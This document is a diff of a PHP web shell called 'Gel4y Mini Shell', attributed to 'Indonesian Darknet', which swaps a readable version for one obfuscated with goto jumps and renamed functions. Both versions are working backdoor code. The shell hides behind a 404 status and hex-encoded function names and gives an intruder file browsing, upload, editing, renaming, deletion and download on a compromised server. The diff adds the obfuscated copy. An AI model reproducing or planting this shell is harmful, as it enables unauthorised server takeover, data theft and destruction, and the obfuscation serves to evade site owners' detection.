@@ -1,159 +1,30 @@
-<?php
-error_reporting(0);
-http_response_code(404);
-define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
-$scD = "s\x63\x61\x6e\x64\x69r";
-$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
-for ($i = 0; $i < count($fc); $i++)
-	$fc[$i] = nhx($fc[$i]);
-if (isset($_GET["p"])) {
-	$p = nhx($_GET["p"]);
-	$fc[3](nhx($_GET["p"]));
-} else {
-	$p = $fc[2]();
-}
-function hex($str) {
-	$r = "";
-	for ($i = 0; $i < strlen($str); $i++)
-		$r .= dechex(ord($str[$i]));
-	return $r;
-}
-function nhx($str) {
-	$r = "";
-	$len = (strlen($str) -1);
-	for ($i = 0; $i < $len; $i += 2)
-		$r .= chr(hexdec($str[$i].$str[$i+1]));
-	return $r;
-}
-function perms($f) {
-	$p = fileperms($f);
-	if (($p & 0xC000) == 0xC000) $i = 's';
-	elseif (($p & 0xA000) == 0xA000) $i = 'l';
-	elseif (($p & 0x8000) == 0x8000) $i = '-';
-	elseif (($p & 0x6000) == 0x6000) $i = 'b';
-	elseif (($p & 0x4000) == 0x4000) $i = 'd';
-	elseif (($p & 0x2000) == 0x2000) $i = 'c';
-	elseif (($p & 0x1000) == 0x1000) $i = 'p';
-	else $i = 'u';
-
-	$i .= (($p & 0x0100) ? 'r' : '-');
-	$i .= (($p & 0x0080) ? 'w' : '-');
-	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
-	$i .= (($p & 0x0020) ? 'r' : '-');
-	$i .= (($p & 0x0010) ? 'w' : '-');
-	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
-	$i .= (($p & 0x0004) ? 'r' : '-');
-	$i .= (($p & 0x0002) ? 'w' : '-');
-	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
-	return $i;
-}
-function a($msg, $sts = 1, $loc = "") {
-	global $p;
-	$status = (($sts == 1) ? "success" : "error");
-	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
-}
-function deldir($d) {
-	global $fc;
-	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
-	if ($fc[6]($d)) {
-		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
-		rmdir($d);
-	} else {
-		unlink($d);
-	}
-}
-?>
-<!doctype html>
-<!-- RandsX aka T1kus_g0t -->
-<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $fc[0]() ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
-<?php
-if (isset($_FILES["f"])) {
-	$n = $_FILES["f"]["name"];
-	for ($i = 0; $i < count($n); $i++) {
-		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
-			a("file uploaded successfully");
-		} else {
-			a("file failed to upload", 0);
-		}
-	}
-}
-if (isset($_GET["download"])) {
-	header("Content-Type: application/octet-stream");
-	header("Content-Transfer-Encoding: Binary");
-	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
-	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
-}
-?>
-</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
-<?php
-$ps = $fc[4]("/(\\\|\/)/", $p);
-foreach ($ps as $k => $v) {
-	if ($k == 0 && $v == "") {
-		echo "<a href=\"?p=2f\">~</a>/"; continue;
-	}
-	if ($v == "") continue;
-	echo "<a href=\"?p=";
-	for ($i = 0; $i <= $k; $i++) {
-		echo hex($ps[$i]);
-		if ($i != $k) echo "2f";
-	}
-	echo "\">{$v}</a>/";
-}
-?>
+<?php goto J4; xE: kV: goto vc; cf: if (isset($_GET["p"])) { goto yy; } goto XV; G6: ?>
 </div></div><article class="bg-dark border table-responsive mt-2">
-<?php if (!isset($_GET["a"])): ?>
+<?php  goto O4; jb: echo $ek[1](); goto FR; JF: goto DK; goto Yx; AV: ?></tbody></table>
+<?php  goto Z0; Yi: q0: goto Cu; xH: isset($_POST["s"]) ? $ek[16]($t8 . '/' . vt($_GET["n"]), $_POST["n"]) ? Me("successfully changed the folder name") : mE("failed to change the folder name", 0) : null; goto ro; CE: ?></h5>
+<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php  goto En; O4: if (!isset($_GET["a"])) { goto Sb; } goto FW; bO: if (!($wL == "delete")) { goto qe; } goto Vq; Uf: goto g6; goto Xj; e1: Ey: goto r8; bZ: xd: goto Qc; cV: ?>
+</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
+<?php  goto jr; Yx: yy: goto L8; Ox: s2: goto bZ; dK: Me("file failed to upload", 0); goto Xi; Vq: $XR = $t8 . '/' . Vt($_GET["n"]); goto gt; Fr: define("IP", "G\x65l\64y M\x69n\x69 Sh\x65ll"); goto SW; ly: header("Content-disposition: attachment; filename=\"" . vT($_GET["n"]) . "\""); goto VG; qF: qe: goto Qj; PX: echo $ek[18]($ek[14]($t8 . '/' . vT($_GET["n"]))); goto bK; zW: ?></span>
+<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php  goto Fl; RL: ?>
+<h5 class="border p-1 mb-3">Rename <?php  goto RO; L8: $t8 = Vt($_GET["p"]); goto oH; s0: DK: goto Kg; NQ: foreach ($Mx as $OM => $xf) { goto AW; dl: echo wg($Mx[$nR]); goto lE; rx: FI: goto cH; le: Sj: goto vZ; s5: ue: goto T5; AW: if (!($OM == 0 && $xf == "")) { goto xX; } goto g2; Gm: $nR = 0; goto Zj; eT: if (!($xf == "")) { goto Sj; } goto qc; Zj: xt: goto AJ; qc: goto FI; goto le; T5: $nR++; goto L2; e2: xX: goto eT; vZ: echo "<a href=\"?p="; goto Gm; Qt: L5: goto OZ; AJ: if (!($nR <= $OM)) { goto L5; } goto dl; Bo: Sx: goto s5; lE: if (!($nR != $OM)) { goto Sx; } goto oK; L2: goto xt; goto Qt; g2: echo "<a href=\"?p=2f\">~</a>/"; goto n8; oK: echo "2f"; goto Bo; n8: goto FI; goto e2; OZ: echo "\">{$xf}</a>/"; goto rx; cH: } goto YA; Kg: function Wg($gd) { goto sb; sb: $bH = ""; goto i6; Py: $bH .= dechex(ord($gd[$nR])); goto O2; CL: ZG: goto GZ; MC: if (!($nR < strlen($gd))) { goto ZG; } goto Py; i6: $nR = 0; goto Qf; Qf: i7: goto MC; GZ: return $bH; goto wa; jx: goto i7; goto CL; Zh: $nR++; goto jx; O2: Vd: goto Zh; wa: } goto DV; YA: cx: goto G6; K2: ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?php  goto qi; Xj: Jy: goto RL; oH: $ek[3](VT($_GET["p"])); goto s0; Gj: Jc: goto cf; JO: ?>
 <table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
-<?php
-$scD = $fc[5]($scD($p), [".", ".."]);
-foreach ($scD as $d) {
-	if (!$fc[6]("$p/$d")) continue;
-	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($fc[8]("$p/$d")) ? "#00ff00" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
-}
-foreach ($scD as $f) {
-	if (!$fc[7]("$p/$f")) continue;
-	$sz = $fc[10]("$p/$f")/1024;
-	$sz = round($sz, 3);
-	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
-	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($fc[8]("$p/$f")) ? "#00ff00" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
-}
-?></tbody></table>
-<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
-<div class="px-2 py-2">
-<?php if ($a == "delete") {
-	$loc = $p.'/'.nhx($_GET["n"]);
-	if ($_GET["t"] == "d") {
-		deldir($loc);
-		if (!$fc[12]($loc)) {
-			a("folder deleted successfully");
-		} else {
-			a("failed to delete the folder", 0);
-		}
-	}
-	if ($_GET["t"] == "f") {
-		$loc = $p.'/'.nhx($_GET["n"]);
-		unlink($loc);
-		if (!$fc[12]($loc)) {
-			a("file deleted successfully");
-		} else {
-			a("file to delete the folder", 0);
-		}
-	}
-}
-?>
-<?php if ($a == "newDir"): ?>
+<?php  goto E6; VG: sy: goto cV; hB: $XR = $t8 . '/' . vT($_GET["n"]); goto OH; j7: if ($wL == "rename") { goto Jy; } goto Kx; FR: ?></span> <br><a href="?p=<?php  goto Og; V4: ?>
 <h5 class="border p-1 mb-3">New folder</h5>
 <form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
+<?php  goto CU; hX: JC: goto q3; Qc: $nR++; goto Ej; Le: if (!$ek[12]($XR)) { goto q0; } goto p7; DV: function Vt($gd) { goto SO; m6: $nR = 0; goto c6; c6: w5: goto uc; OJ: return $bH; goto aE; ic: $nR += 2; goto y2; uc: if (!($nR < $Fc)) { goto j2; } goto rf; y2: goto w5; goto ci; dj: a9: goto ic; SO: $bH = ""; goto ak; ci: j2: goto OJ; ak: $Fc = strlen($gd) - 1; goto m6; rf: $bH .= chr(hexdec($gd[$nR] . $gd[$nR + 1])); goto dj; aE: } goto pO; k8: $nR = 0; goto ad; ZI: Me("file deleted successfully"); goto H_; jr: $Mx = $ek[4]("/(\\\\|\\/)/", $t8); goto NQ; jN: http_response_code(404); goto Fr; Y9: header("Content-Transfer-Encoding: Binary"); goto pZ; jM: ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+<?php  goto xH; Fl: echo $ek[18]($ek[14]($t8 . '/' . vT($_GET["n"]))); goto Kk; k1: function ME($XS, $Pm = 1, $XR = "") { goto B2; B2: global $t8; goto aa; h4: echo "<script>swal({title: \"{$kz}\", text: \"{$XS}\", icon: \"{$kz}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . WG($t8) . $XR . "\"}})</script>"; goto ou; aa: $kz = $Pm == 1 ? "success" : "error"; goto h4; ou: } goto n4; Pz: g6: goto TJ; dr: ME("file to delete the folder", 0); goto FT; mi: s4: goto Ai; vc: Me("file uploaded successfully"); goto Ox; n4: function jr($so) { goto mN; Gu: if ($ek[6]($so)) { goto Lq; } goto wd; gP: array_map("deldir", glob($so . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); goto sj; n9: return; goto py; jJ: if (!(trim(pathinfo($so, PATHINFO_BASENAME), '.') === '')) { goto CV; } goto n9; LR: xY: goto KP; sj: rmdir($so); goto LR; mN: global $ek; goto jJ; GF: goto xY; goto Y3; Y3: Lq: goto gP; wd: unlink($so); goto GF; py: CV: goto Gu; KP: } goto yE; gR: Sb: goto JO; En: echo VT($_GET["n"]); goto jM; Z1: if (!isset($_GET["download"])) { goto sy; } goto d7; J4: error_reporting(0); goto jN; r8: ?>
+<h5 class="border p-1 mb-3">Edit file</h5>
+<span>File name : <?php  goto Li; Ga: if (!($nR < count($M7))) { goto s4; } goto FJ; CU: isset($_POST["s"]) ? $ek[12]("{$t8}/{$_POST["n"]}") ? mE("folder name has been used", 0, "&a=" . wG("newDir")) : ($ek[15]("{$t8}/{$_POST["n"]}") ? mE("folder created successfully") : ME("folder failed to create", 0)) : null; goto sM; XV: $t8 = $ek[2](); goto JF; RO: echo $_GET["t"] == "d" ? "folder" : "file"; goto CE; S5: hs: goto eO; IE: ?>">+File</a><a href="?p=<?php  goto Sc; sF: $ek[$nR] = Vt($ek[$nR]); goto Nc; Sc: echo wg($t8) . "&a=" . Wg("newDir"); goto bL; H_: Dr: goto Am; A9: dq: goto Ol; KX: echo $ek[0](); goto d4; gt: if (!($_GET["t"] == "d")) { goto Mx; } goto tK; ro: goto g6; goto e1; d7: header("Content-Type: application/octet-stream"); goto Y9; Am: bA: goto qF; FT: goto Dr; goto FU; pO: function C3($qU) { goto D2; hc: if (($t8 & 0x4000) == 0x4000) { goto M5; } goto d6; gy: $nR = '-'; goto Eo; ql: if (($t8 & 0xa000) == 0xa000) { goto xD; } goto wH; Nl: $nR = 'u'; goto ki; KF: M5: goto b6; Ns: $nR .= $t8 & 0x100 ? 'r' : '-'; goto a3; a3: $nR .= $t8 & 0x80 ? 'w' : '-'; goto vY; ki: goto eP; goto Vw; Gn: goto eP; goto KF; Eo: goto eP; goto iY; pi: if (($t8 & 0xc000) == 0xc000) { goto r4; } goto ql; uZ: if (($t8 & 0x6000) == 0x6000) { goto eQ; } goto hc; gY: St: goto dm; mg: $nR .= $t8 & 0x2 ? 'w' : '-'; goto Rz; F0: $nR .= $t8 & 0x4 ? 'r' : '-'; goto mg; JU: if (($t8 & 0x1000) == 0x1000) { goto U4; } goto Nl; sv: goto eP; goto Fj; iY: eQ: goto ED; nV: $nR = 'l'; goto Sf; jp: $nR .= $t8 & 0x20 ? 'r' : '-'; goto Zu; uN: $nR .= $t8 & 0x8 ? $t8 & 0x400 ? 's' : 'x' : ($t8 & 0x400 ? 'S' : '-'); goto F0; JS: $nR = 'p'; goto V2; Yr: Qg: goto gy; Vw: r4: goto TC; TC: $nR = 's'; goto GI; Fj: U4: goto JS; ED: $nR = 'b'; goto Gn; pP: return $nR; goto ih; vY: $nR .= $t8 & 0x40 ? $t8 & 0x800 ? 's' : 'x' : ($t8 & 0x800 ? 'S' : '-'); goto jp; Zu: $nR .= $t8 & 0x10 ? 'w' : '-'; goto uN; hd: goto eP; goto gY; b6: $nR = 'd'; goto hd; gr: xD: goto nV; Sf: goto eP; goto Yr; GI: goto eP; goto gr; D2: $t8 = fileperms($qU); goto pi; wH: if (($t8 & 0x8000) == 0x8000) { goto Qg; } goto uZ; dm: $nR = 'c'; goto sv; Rz: $nR .= $t8 & 0x1 ? $t8 & 0x200 ? 't' : 'x' : ($t8 & 0x200 ? 'T' : '-'); goto pP; d6: if (($t8 & 0x2000) == 0x2000) { goto St; } goto JU; V2: eP: goto Ns; ih: } goto k1; Cu: ME("folder deleted successfully"); goto aR; W1: goto tp; goto Yi; k0: ap: goto AV; g3: if (!($nR < count($ek))) { goto Jc; } goto sF; bK: ?></textarea></div><?php  goto Pz; p7: Me("failed to delete the folder", 0); goto W1; k6: echo Vt($_GET["n"]); goto Zf; eO: ?>
+<h5 class="border p-1 mb-3">View file</h5>
+<span>File name : <?php  goto k6; HH: isset($_POST["s"]) ? $ek[13]($t8 . '/' . vT($_GET["n"]), $_POST["ctn"]) ? ME("file contents changed successfully", 1, "&a=" . WG("view") . "&n={$_GET["n"]}") : me("file contents failed to change") : null; goto qC; q3: ?>
 <h5 class="border p-1 mb-3">New file</h5>
 <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
-<h5 class="border p-1 mb-3">Rename <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
-<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
-<h5 class="border p-1 mb-3">Edit file</h5>
-<span>File name : <?= nhx($_GET["n"]) ?></span>
-<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
-<h5 class="border p-1 mb-3">View file</h5>
-<span>File name : <?= nhx($_GET["n"]) ?></span>
-<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
+<?php  goto RE; lb: goto ik; goto gR; Xa: $nR = 0; goto CS; OV: $nR++; goto Te; Nm: goto g6; goto HO; OT: Mx: goto f3; wD: $wL = VT($_GET["a"]); goto A9; hN: $ek = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); goto k8; d4: ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+<?php  goto L7; nw: foreach ($W9 as $so) { goto n3; hQ: echo "<tr><td><a href=\"?p=" . Wg("{$t8}/{$so}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $ek[19]("Y-m-d H:i", $ek[20]("{$t8}/{$so}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$so}</a></td><td>N/A</td><td><font color=\"" . ($ek[8]("{$t8}/{$so}") ? "#00ff00" : (!$ek[9]("{$t8}/{$so}") ? "red" : null)) . "\">" . c3("{$t8}/{$so}") . "</font></td><td><a href=\"?p=" . wg($t8) . "&a=" . wg("rename") . "&n=" . wg($so) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=" . Wg($t8) . "&a=" . Wg("delete") . "&n=" . Wg($so) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>"; goto kn; n3: if ($ek[6]("{$t8}/{$so}")) { goto To; } goto M_; ys: To: goto hQ; M_: goto MM; goto ys; kn: MM: goto zH; zH: } goto YM; vX: $M7 = $_FILES["f"]["name"]; goto Xa; Kx: if ($wL == "edit") { goto Ey; } goto uo; CS: L_: goto Ga; Kk: ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+<?php  goto HH; L7: if (!isset($_FILES["f"])) { goto uj; } goto vX; FW: if (!isset($_GET["a"])) { goto dq; } goto wD; Z0: ik: goto I6; aR: tp: goto OT; RV: if (!$ek[12]($XR)) { goto Jh; } goto dr; Ik: ?></a></h3></div><div><span>PHP Version : <?php  goto jb; FJ: if ($ek[11]($_FILES["f"]["tmp_name"][$nR], $M7[$nR])) { goto kV; } goto dK; Te: goto Gi; goto Gj; yE: ?>
+<!doctype html>
+<!-- RandsX aka T1kus_g0t -->
+<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?php  goto ca; ca: echo IP; goto K2; qi: echo IP; goto Ik; Ol: ?>
+<div class="px-2 py-2">
+<?php  goto bO; E6: $W9 = $ek[5]($W9($t8), [".", ".."]); goto nw; sM: goto g6; goto hX; OH: unlink($XR); goto RV; pZ: header("Content-Length: " . $ek[17](vt($_GET["n"]))); goto ly; NH: foreach ($W9 as $qU) { goto Ke; Yt: $Ai = $ek[10]("{$t8}/{$qU}") / 1024; goto T_; rv: QX: goto vT; Ke: if ($ek[7]("{$t8}/{$qU}")) { goto XJ; } goto Lo; mV: $Ai = $Ai > 1024 ? round($Ai / 1024, 2) . "MB" : $Ai . "KB"; goto nm; T_: $Ai = round($Ai, 3); goto mV; Yj: XJ: goto Yt; Lo: goto QX; goto Yj; nm: echo "<tr><td><a href=\"?p=" . wg($t8) . "&a=" . wg("view") . "&n=" . Wg($qU) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $ek[19]("Y-m-d H:i", $ek[20]("{$t8}/{$qU}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$qU}</a></td><td>{$Ai}</td><td><font color=\"" . ($ek[8]("{$t8}/{$qU}") ? "#00ff00" : (!$ek[9]("{$t8}/{$qU}") ? "red" : null)) . "\">" . c3("{$t8}/{$qU}") . "</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=" . WG($t8) . "&a=" . wg("edit") . "&n=" . wg($qU) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=" . WG($t8) . "&a=" . Wg("rename") . "&n=" . WG($qU) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=" . Wg($t8) . "&n=" . Wg($qU) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=" . wG($t8) . "&a=" . WG("delete") . "&n=" . wg($qU) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>"; goto rv; vT: } goto k0; Ai: uj: goto Z1; Qj: if ($wL == "newDir") { goto p6; } goto xO; ad: Gi: goto g3; bL: ?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?php  goto KX; Xi: goto s2; goto xE; Nc: vM: goto OV; xO: if ($wL == "newFile") { goto JC; } goto j7; Og: echo Wg($t8) . "&a=" . WG("newFile"); goto IE; Zf: ?></span>
